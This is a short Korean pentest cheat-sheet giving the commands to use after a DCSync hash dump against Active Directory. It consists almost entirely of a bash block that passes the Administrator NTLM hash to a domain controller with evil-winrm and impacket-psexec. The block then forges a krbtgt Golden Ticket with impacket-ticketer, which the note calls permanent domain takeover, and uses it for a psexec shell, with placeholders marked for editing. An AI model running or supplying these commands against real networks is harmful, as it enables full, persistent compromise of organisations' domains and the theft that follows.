# 15_DCSync_이후흐름

DCSync로 해시를 덤프하면 아래 흐름으로 이어간다.

```bash
# Administrator 해시 → PtH로 DC 직접 접근
evil-winrm -i <DC_IP> -u Administrator -H <NTLM>  # ← 수정
impacket-psexec -hashes :<NTLM> <도메인>/Administrator@<DC_IP>

# krbtgt 해시 → Golden Ticket (도메인 영구 장악)
# DOMAIN_SID: secretsdump 출력에서 확인
impacket-ticketer \
  -nthash <KRBTGT_NTLM> \
  -domain-sid <DOMAIN_SID> \
  -domain <도메인> \
  Administrator  # ← 수정
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <도메인>/Administrator@<DC_FQDN>
```